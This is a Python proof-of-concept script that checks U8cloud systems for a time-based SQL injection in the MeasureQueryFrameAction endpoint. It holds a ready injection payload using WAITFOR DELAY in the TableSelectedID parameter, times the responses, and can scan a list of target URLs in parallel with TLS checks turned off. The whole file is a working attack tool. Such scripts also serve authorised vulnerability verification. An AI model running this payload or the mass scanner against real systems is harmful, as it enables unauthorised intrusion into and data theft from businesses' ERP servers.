import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """

   __  ______       __                __
  / / / ( __ )_____/ /___  __  ______/ /
 / / / / __  / ___/ / __ \/ / / / __  / 
/ /_/ / /_/ / /__/ / /_/ / /_/ / /_/ /  
\____/\____/\___/_/\____/\__,_/\__,_/   
                                        

"""
    print(test)


def poc(target):
    payload = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+"

    try:
        response = requests.get(target, verify=False,timeout=10)
        response1 = requests.get(target + payload, timeout=10, verify=False)
        time1 = response.elapsed.total_seconds()
        time2 = response1.elapsed.total_seconds()
        if time2 - time1 > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {target} 存在U8cloud 系统 MeasureQueryFrameAction 接口存在 SQL注入漏洞")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description=" U8cloud 系统 MeasureQueryFrameAction 接口存在 SQL注入漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()